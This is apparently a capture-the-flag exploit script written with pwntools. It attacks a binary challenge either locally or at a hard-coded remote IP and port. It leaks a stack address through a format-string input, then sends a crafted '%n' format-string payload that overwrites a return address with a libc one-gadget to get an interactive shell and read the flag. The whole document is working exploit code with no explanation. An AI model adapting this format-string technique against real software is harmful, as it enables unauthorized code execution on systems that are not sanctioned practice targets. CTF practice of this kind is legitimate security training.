from pwn import *
import sys

elf = context.binary = ELF('./chall_patched')
libc = elf.libc
if args.REMOTE:
    p = remote("34.42.147.172", 4003)
else:
        p = elf.process()

one_gadgets = [int(i)-0x2a1ca for i in "361429 361436 361443 361450 361455 361463 361470 361474 361479 361484 361489 980174 980267 1118634 1118642 1118647 1118657".split(" ")]
sla = lambda a, b: p.sendlineafter(a, b)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)
rl = lambda: p.recvline()
ru = lambda a: p.recvuntil(a, drop=True)

sa(b"flag)", b"%"*9)
leak = int(ru(b"ril"), 16) - 0x180
log.info(f"leak @ {hex(leak)}")
sla(b"....", b"")
# gdb.attach(p, "break *printf+46308")
# gdb.attach(p, "break *main+263")

payload =  b"%*25$c"
payload += f"%{one_gadgets[1]}c".encode()
payload += b"%16$n"
payload += b"A" * (80 - len(payload))
payload += p64(leak)

print(payload)

sla(b"Input :", payload)

# ./flag.txt after getting a shell to get the flag on stderr

p.interactive()
